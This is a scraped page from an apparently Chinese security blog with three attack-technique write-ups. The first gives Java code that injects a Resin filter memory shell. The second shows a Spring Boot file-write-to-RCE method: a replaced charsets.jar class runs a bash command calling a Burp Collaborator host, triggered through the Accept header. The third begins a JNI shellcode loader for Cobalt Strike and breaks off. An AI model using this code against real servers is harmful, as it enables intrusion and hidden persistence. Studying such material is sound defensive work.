<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515144738186.png" alt="image-20210515144738186"></p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515145059406.png" alt="image-20210515145059406"></p>
<p>​        同样在addFilterMapping打断点，可以看到是在WebApp.addFilterMapping方法调用了该方法.</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515150152386.png" alt="image-20210515150152386"></p>
<p>​        查看自定义Filter,在创建FilterConfigImpl对象时,包含了_filterName, _filterClassName, _filterClass, _webApp, _servletContext, _filerManager信息，所以我们动态创建的FilterConfigImpl对象也应该包含这些信息。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515152308565.png" alt="image-20210515152308565"></p>
<p>​        但是在<code>com.caucho.server.webapp.WebApp#addFilterMapping</code>中需要创建FilterMapping对象，查看类的继承关系，发现FilterMapping是FilterConfigImpl的子类，因此直接创建FilterMapping就好了。</p>
<p><img src="/2021/05/15/%E6%B3%9B%E5%BE%AEXstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210515165358412.png" alt="image-20210515165358412"></p>
<p>​        所以整体的Filter型内存马思路如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 获取WebApp对象2. 创建FilterMapping对象，并设置_filterName, _filterClassName, _filterClass, _webApp, _servletContext, _filerManager,_urlpattern等信息。3. 通过WebApp.addFilterMapping设置 _filter的信息。</span><br></pre></td></tr></table></figure>

<h5 id="获取WebApp对象"><a href="#获取WebApp对象" class="headerlink" title="获取WebApp对象"></a>获取WebApp对象</h5><p>​        首先是要获取WebApp的类加载器，我们可以通过ThreadContext获取，其次要获取WebApp对象，所以要寻找返回WebApp对象的方法，最好是static的，static的话我们可以直接通过反射获取而不用再去获取那个对象。经过搜索可以通过调用<code>com.caucho.server.webapp.WebApp#getCurrent</code>来获取，所以获取WebApp对象的代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classloader = Thread.currentThread().getContextClassLoader(); Class app = classloader.loadClass(<span class="string">"com.caucho.server.webapp.WebApp"</span>); WebApp webapp =  (WebApp)servletInvocationcls.getMethod(<span class="string">"getCurrent"</span>).invoke(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<h5 id="创建FilterMapping对象"><a href="#创建FilterMapping对象" class="headerlink" title="创建FilterMapping对象"></a>创建FilterMapping对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilterMapping mapping=<span class="keyword">new</span> FilterMapping();            mapping.setFilterName(<span class="string">"test666"</span>); <span class="comment">//设置_filterName            Filter test=new ResinFilter();            mapping.setFilter(test);            Class ResinFilter=test.getClass(); //获取要FilterClass            mapping.setFilterClass(ResinFilter);//设置_filerClass            mapping.setWebApp(webapp); //设置webapp            webapp.addFilter(mapping); //设置servletContext，_filterManager和webApp,调用com.caucho.server.dispatch.FilterManager#addFilter向_filters中添加内容。            FilterMapping.URLPattern part=mapping.createUrlPattern();            part.addText("test666");// 向_urlPattern和_urlPatterns添加内容。            webapp.addFilterMapping(mapping); //向_filterMapper写入内容。</span></span><br></pre></td></tr></table></figure>

<p>​    最后整体代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classloader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">      Class app = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          app = classloader.loadClass(<span class="string">"com.caucho.server.webapp.WebApp"</span>);</span><br><span class="line">          WebApp webapp =  (WebApp)app.getMethod(<span class="string">"getCurrent"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">          FilterMapping mapping=<span class="keyword">new</span> FilterMapping();</span><br><span class="line">          mapping.setFilterName(<span class="string">"test666"</span>); <span class="comment">//设置_filterName</span></span><br><span class="line">          Filter test=<span class="keyword">new</span> ResinFilter();</span><br><span class="line">          mapping.setFilter(test);</span><br><span class="line">          Class ResinFilter=test.getClass(); <span class="comment">//获取要FilterClass</span></span><br><span class="line">          mapping.setFilterClass(ResinFilter);<span class="comment">//设置_filerClass</span></span><br><span class="line">          mapping.setWebApp(webapp); <span class="comment">//设置webapp</span></span><br><span class="line">          webapp.addFilter(mapping); <span class="comment">//设置servletContext，_filterManager和webApp,调用com.caucho.server.dispatch.FilterManager#addFilter向_filters中添加内容。</span></span><br><span class="line">          FilterMapping.URLPattern part=mapping.createUrlPattern();</span><br><span class="line">          part.addText(<span class="string">"test666"</span>);<span class="comment">// 向_urlPattern和_urlPatterns添加内容。</span></span><br><span class="line">          webapp.addFilterMapping(mapping); <span class="comment">//向_filterMapper写入内容。</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Spring Boot Fat Jar 写文件getshell技术分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-04-16 11:31:57" itemprop="dateCreated datePublished" datetime="2021-04-16T11:31:57+08:00">2021-04-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-04-23 11:05:40" itemprop="dateModified" datetime="2021-04-23T11:05:40+08:00">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    之前在审计的过程中发现，很多JAVA开发的网站经常使用springboot，而springboot又是可以独立于tomcat部署web项目的，而且在不做特殊配置的情况下，也并不解析jsp文件，当时也在想，如果在渗透的过程中发现了一个任意文件上传漏洞，并且目标网站没有内置jsp或者jspx的解析引擎，我该如何getshell？</p>
<p>​        以我目前的知识积累来看，在linux下且高权限的情况下，可以通过写入计划任务反弹shell。在windows下高权下可以通过写自启动的方式getshell，但是使用这些方式显然要求都比较高，一方面是需要高权限，另一方面在windows下可能有些上传点并不支持上传exe或者dll，也需要等到程序下次启动时才能上线，但是对于服务器来讲，可能管理员很久也不上来操作，这显然也是不行的。后来也想过替换jar包的方式getshell，但想到jar在运行期间替换也是不可行的。最近刚好看到<a href="https://landgrey.me/blog/22/" target="_blank" rel="noopener">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a>,作者通过分析JDK中自带且在运行期间默认没有加载的JAR完成了getshell的操作，我本着学习的态度写下了这个文章。</p>
<h2 id="JAVA的类加载"><a href="#JAVA的类加载" class="headerlink" title="JAVA的类加载"></a>JAVA的类加载</h2><p>​        一个类的生命周期主要经过下面这几个阶段，我们主要关注的是<strong>类加载</strong>阶段。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210416140018288.png" alt="image-20210416140018288"></p>
<p><strong>类加载阶段主要做了什么?</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、通过一个类的全限定名来获取定义此类的二进制字节流。</span><br><span class="line">2、将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。</span><br><span class="line">3、在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入</span><br><span class="line">口。</span><br></pre></td></tr></table></figure>

<p><strong>可以通过什么途径加载class文件?</strong></p>
<p>JAVA中获取class文件的方式并不单一，可以通过下面的方式获取class文件，当然比较常用的方式还是通过jar包或者本地的class文件获取。</p>
<ul>
<li>从本地系统中直接加载</li>
<li>通过网络下载.class文件</li>
<li>从zip，jar等归档文件中加载.class文件</li>
<li>从专有数据库中提取.class文件</li>
<li>将Java源文件动态编译为.class文件</li>
</ul>
<p>​    并不需要等到某个类被使用时才去加载，，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它。比如当虚拟机启动时，会去加载JAVA_HOME/jre/lib/下的rt.jar下的.class文件文件。我们编写一个简单类测试下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello word!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在启动时加入<code>-XX:+TraceClassLoading</code>参数即可获得加载信息，可以看到加载了<code>JAVA_HOME/lib/rt.jar</code>的多个类,并没有加载其他<code>JAVA_HOME/jre/lib/</code>目录下其他jar包下的类。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210416142615877.png" alt="image-20210416142615877"></p>
<p>​        由于我们需要测试的是springboot打包的WEB项目，所以也可以搭建一个简单的springboot web项目，看看会加载哪些JAR？我编写了一个空的springBoot web项目，经过测试会在启动是加载下面的4个JDK自带的jar，可以看到这里明显是加载了charsets.jar，似乎和LandGrey文章里提到的不太一样。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210416145449763.png" alt="image-20210416145449763"></p>
<p>​        经过问题排查，在使用maven编译打包是，会生成一个xml文件，在这个配置文件中有GBK编码的设置。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210416172809628.png" alt="image-20210416172809628"></p>
<p>​        当使用maven编译跳过测试打包时，则不会生成surefire-reports目录，下面再测试下是否加载了charsets.jar。经过测试还是会加载charsets.jar，可能再下面的几个依赖包中都有设置字符集的操作吧。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210416174146598.png" alt="image-20210416174146598"></p>
<p>​        显然这几个文件在程序运行中想要替换是不行的，会拒绝访问，没有加载的JAR则可以直接替换。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421101821075.png" alt="image-20210421101821075"></p>
<p>​        使用作者在github上提供的<a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/tree/main/fatJarWriteFileRCE" target="_blank" rel="noopener">测试代码</a>来分析是否加载了charsets.jar，发现在springboot程序启动的过程中还是会open下面的三个系统jar,所以理论上是不可以替换这三个jar文件的。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421102356931.png" alt="image-20210421102356931"></p>
<p>​        这样测试的结果并不准确，使用handle.exe可以看到程序依赖的所有jar文件。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421112205926.png" alt="image-20210421112205926"></p>
<p>​        这些jar文件显然也不能直接覆盖利用，但在linux下执行并不会加载charsets.jar文件，所以作者说到的覆盖charsets.jar这种思路目前只适用于Linux场景，不过问题不大，一般Linux跑spingboot项目会遇到的比较多。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421112702354.png" alt="image-20210421112702354"></p>
<p>​        和windows类似，直接通过查看系统调用可以看到具体依赖哪些jar文件。 </p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421134828346.png" alt="image-20210421134828346"></p>
<p>​        虽然Linux下确实没有加载Charsets.jar，但是我还有下面的疑问</p>
<ul>
<li><p>已经Opened过的jar在Linux下能否覆盖？</p>
<p>​    经过测试，在Linux下即使程序正在运行中，也可以直接通过上传覆盖系统的jar文件。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421143003473.png" alt="image-20210421143003473"></p>
<p>既然在linux中可以在运行时覆盖系统的jar包，我们能不能直接覆盖一个已经被load的类？虽然确实可以这么做，但是由于springboot项目在启动时已经将ri.jar或者jsse.jar中的class加载到虚拟机了，所以即使在后面需要使用这个类，会直接从JVM虚拟机中直接加载执行，而不会再将这些类重新Load。</p>
</li>
<li><p>springboot启动会不会将jar中的所有类全部加载？</p>
<p>经过测试，springboot并不会在启动时将某个加载的jar的所有class类进行加载，以jfr.jar为例，也仅仅加载了<code>jdk.jfr.internal.EventWriter</code>,这个也非常容易理解，如果每次需要加载某个class都需要将对应jar里的所有class都加载一遍，对JVM来说也是一个很大的性能损耗。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421152915142.png" alt="image-20210421152915142"></p>
<p>通过上面的分析和测试，无论springboot在Linux中是否加载了Charsets.jar文件，我们都可以找一个不常用的类来触发我们的payload。</p>
</li>
</ul>
<h2 id="JAVA类的初始化"><a href="#JAVA类的初始化" class="headerlink" title="JAVA类的初始化"></a>JAVA类的初始化</h2><p>​        前面我们大致了解了类的加载，但是加载了类并不代表我们的逻辑被执行，所以还要了解一下类的初始化阶段？</p>
<p><strong>类的初始化主要做什么？</strong></p>
<ul>
<li>执行&lt; clinit &gt;(静态变量及其赋值语句、静态代码块、静态方法）</li>
<li>虚拟机会保证在子类&lt; clinit &gt;的执行之前，父类的&lt; clinit &gt;()先执行</li>
</ul>
<p><strong>什么时候会触发类的初始化？</strong></p>
<p>​        下面的几种情况会进行类的初始化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用new关键字实例化对象</span><br><span class="line">读取或设置一个类型的静态字段</span><br><span class="line">使用java.lang.reflect包的方法对类型进行反射调用的时候</span><br><span class="line">当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化</span><br><span class="line">当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类</span><br></pre></td></tr></table></figure>

<p><strong>类初始化注意事项</strong></p>
<p>​    同一个类加载器下，一个类型只会被初始化一 次。</p>
<p>通过上面的分析，我们可以尝试将恶意代码放到某个没有被load的static代码块中，只要找到触发这个类完成初始化的方法，即可执行我们的恶意代码。</p>
<h2 id="主动触发的初始化"><a href="#主动触发的初始化" class="headerlink" title="主动触发的初始化"></a>主动触发的初始化</h2><p>​        在<code>org.springframework.web.accept.HeaderContentNegotiationStrategy#resolveMediaTypes</code>中，会去接收<strong>Accept</strong>参数。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421163653495.png" alt="image-20210421163653495"></p>
<p>​        在<code>org.springframework.util.MimeTypeUtils#parseMimeTypeInternal</code>中会对accapt请求头的内容进行解析。将<code>;</code>后的内容放到LinkedHashMap中。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421164135404.png" alt="image-20210421164135404"></p>
<p>​        在<code>org.springframework.util.MimeType#MimeType(java.lang.String, java.lang.String, java.util.Map&lt;java.lang.String,java.lang.String&gt;)</code>中解析parameters的值，并调用了<code>org.springframework.util.MimeType#checkParameters</code>。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421164443669.png" alt="image-20210421164443669"></p>
<p>​        在<code>org.springframework.util.MimeType#checkParameters</code>中会去检查key是否为charset如果是则通过<code>Charset.forName(value);</code>加载charsets.jar中的某个类。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421164455715.png" alt="image-20210421164455715"></p>
<p>​        当某个类没有加载过时，会执行这个类的static静态代码块。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210421165942332.png" alt="image-20210421165942332"></p>
<p>​        所以可以选择某个不太常用的编码方式的static静态代码块进行替换，来执行我们的恶意代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.nio.cs.ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Big5_HKSCS</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        fun();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> java.util.<span class="function">HashMap&lt;String, String&gt; <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String[] command = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"ping -c 1 bxcrq03prifaz03loenphr30wr2iq7.burpcollaborator.net"</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e1)&#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编译文件后，将编译好的Big5_HKSCS.class文件放到charsets.jar中，上传修改过的jar文件，由于charsets.jar文件比较大3M左右，所以上传时间会比较长。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210422092318446.png" alt="image-20210422092318446"></p>
<p>​        最终通过设置Accept头触发恶意代码。</p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210422092420169.png" alt="image-20210422092420169"></p>
<p><img src="/2021/04/16/Spring-Boot-Fat-Jar-%E5%86%99%E6%96%87%E4%BB%B6getshell%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/image-20210422092627792.png" alt="image-20210422092627792"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        总的来说这种利用这种方式需要一些条件，利用成本也比较高。</p>
<ul>
<li>需要以高权限的方式开启springboot</li>
<li>跨任意目录上传</li>
<li>对于charsets.jar来说windows启动会加载并占用，无法在运行期间覆盖，所以并不适用</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">jsp文件加载shellcode上线cobaltstrike实现</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-05 13:50:51" itemprop="dateCreated datePublished" datetime="2021-01-05T13:50:51+08:00">2021-01-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-06 17:40:05" itemprop="dateModified" datetime="2021-01-06T17:40:05+08:00">2021-01-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前浏览github时候发现<code>https://github.com/Ramos-dev/R9000/blob/master/README.md</code>项目，作者实现了通过JAVA加载shellcode上线cobaltstrike的功能，因为关于JAVA加载shellcode上线cobaltstrike的文章和方法不是很多，其免杀的情况也不清楚，因此打算写一篇文章复现和分析如何通过<code>JAVA加载shellcode上线cobaltstrike</code>。</p>
<p>​        通过查阅资料，目前已有的方法是用过JNI和JNA来实现注入shellcode的，所以先了解下JNI。</p>
<h2 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h2><h3 id="什么是JNI"><a href="#什么是JNI" class="headerlink" title="什么是JNI?"></a>什么是JNI?</h3><p>​    <strong>JNI</strong>是Java Native Interface的缩写，即Java本地接口。 它定义了一种虚拟机中的Java代码与用C/C++编写的本地代码交互的方式。支持从动态库中加载代码。使用JNI技术可以通过JAVA调用C/C++代码，也可以通过C/C++的代码调用Java的代码。</p>
<h3 id="为什么使用JNI？"><a href="#为什么使用JNI？" class="headerlink" title="为什么使用JNI？"></a>为什么使用JNI？</h3><ul>
<li>可以复用C/C++实现好的动态链接库。</li>
<li>编译为so/dll文件相对于JAVA class对象更加安全</li>
<li>C/C++开发更偏向底层，运行效率更高，也能使JAVA访问底层的特性。</li>
</ul>
<h3 id="如何使用JNI？"><a href="#如何使用JNI？" class="headerlink" title="如何使用JNI？"></a>如何使用JNI？</h3><p><strong>编写JAVA类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="comment">//声明一个native方法，该方法在C中实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testHello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//加载C文件</span></span><br><span class="line">        System.loadLibrary(<span class="string">"TestJNI"</span>);</span><br><span class="line">        Hello jniDemo = <span class="keyword">new</span> Hello();</span><br><span class="line">        jniDemo.testHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>生成C文件头</strong></p>
<p><code>javah -classpath . -jni Hello</code></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105165305767.png" alt="image-20210105165305767"></p>
<p><strong>创建DLL项目</strong></p>
<p>​        使用visual studio创建DLL项目，并创建一个test666.cpp文件。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105170652974.png" alt="image-20210105170652974"></p>
<p><strong>导入头文件</strong></p>
<p>​        在JDK下的include目录下找到jni.h，include/win32下找到jni_md.h还有之前编译好的Hello.h文件拷贝到项目目录下。</p>
